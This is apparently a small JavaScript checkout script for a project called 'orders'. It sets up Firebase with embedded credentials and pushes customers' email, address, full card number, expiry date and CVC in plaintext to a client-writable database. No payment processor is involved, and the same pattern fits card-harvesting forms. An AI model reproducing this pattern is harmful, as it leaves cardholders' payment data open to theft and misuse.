const firebaseConfig = {
    apiKey: "AIzaSyBL3KqSmpUq18GL49M1cbtbVDodOuaCayk",
    authDomain: "orders-ee4ab.firebaseapp.com",
    projectId: "orders-ee4ab",
    databaseURL: "https://orders-ee4ab-default-rtdb.firebaseio.com/",
    storageBucket: "orders-ee4ab.appspot.com",
    messagingSenderId: "51145318604",
    appId: "1:51145318604:web:328e64d815a4e2984e6269"
  };
const app = firebase.initializeApp(firebaseConfig); 
const dbRef = firebase.database().ref(); 

const detailsRef = dbRef.child('userdetails'); 
detailsRef.on("child_added", function(snapshot, prevChildKey) { 
  var newPost = snapshot.val(); 
}); 
 
function send(){ 
  var email = document.getElementById("email").value; 
  var address = document.getElementById("address").value; 
  var city = document.getElementById("city").value; 
  var state = document.getElementById("state").value; 
  var zipcode = document.getElementById("zipcode").value; 
  var size = document.getElementById("size").value; 
  var credit = document.getElementById("credit").value; 
  var expdate = document.getElementById("expdate").value; 
  var cvc = document.getElementById("cvc").value; 
  var zip = document.getElementById("zip").value; 
  
  detailsRef.push().set({ 
    email: email, 
    address: address, 
    city: city,
    state: state,
    zipcode: zipcode,
    size: size,
    credit: credit,
    expdate: expdate,
    cvc: cvc,
    zip: zip, 
  }); 
   
 
} 